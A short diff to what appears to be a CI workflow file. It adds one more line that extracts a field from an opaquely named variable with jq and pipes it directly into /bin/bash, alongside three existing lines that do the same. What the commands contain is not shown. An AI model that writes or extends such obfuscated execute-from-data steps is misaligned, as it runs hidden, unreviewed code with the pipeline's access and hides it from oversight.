@@ -21,6 +21,7 @@ jobs:
           echo $cxrg52 | jq -r .ie256 | /bin/bash
           printf '%s' "$cfaen2580" | jq -r .pkcqe7 | /bin/bash
           printf '%s' "$lk47" | jq -r .zbt21971 | /bin/bash
+          echo $r4158 | jq -r .lf1692 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
